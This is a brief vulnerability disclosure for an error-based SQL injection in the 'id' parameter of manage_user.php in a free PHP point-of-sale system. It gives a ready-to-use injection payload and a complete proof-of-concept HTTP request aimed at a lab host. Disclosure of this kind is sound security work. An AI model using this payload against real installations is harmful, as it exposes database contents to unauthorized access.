# SQLi-5

# Vulnerability Description

The best-pos-management-system-php in PHP Free Source Code (It is an open source project from [www.sourcecodester.com](www.sourcecodester.com)) has SQL injection vulnerabilities, which can lead to database information leakage.

1. BUG_Author:
2. vendors: [https://www.sourcecodester.com/php/16127/best-pos-management-system-php.html](https://www.sourcecodester.com/php/16127/best-pos-management-system-php.html)
3. The program is built using the PHP 7.3.4nts version;
4. Vulnerability location: /manage_user.php

[+] Payload:

```http
id=1%20OR%20(SELECT%204743%20FROM(SELECT%20COUNT(*),CONCAT('~',version(),'~',FLOOR(RAND(0)*2))x%20FROM%20INFORMATION_SCHEMA.PLUGINS%20GROUP%20BY%20x)a)
```

POC：

```http
GET http://10.0.10.39/kruxton/manage_user.php?id=1%20OR%20(SELECT%204743%20FROM(SELECT%20COUNT(*),CONCAT('~',version(),'~',FLOOR(RAND(0)*2))x%20FROM%20INFORMATION_SCHEMA.PLUGINS%20GROUP%20BY%20x)a) HTTP/1.1
Host: 10.0.10.39
Upgrade-Insecure-Requests: 1
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/122.0.0.0 Safari/537.36 Edg/122.0.0.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7
Accept-Encoding: gzip, deflate
Accept-Language: zh-CN,zh;q=0.9
Cookie: hide-dotfile=no; PHPSESSID=98umeubo6lpdpkv3bgsekd9udu
Connection: close


```

## How to verify

Build the vulnerability environment according to the steps provided by the source code author and execute the poc provided above：

​![image](assets/image-20240313104308-52wr49k.png)​
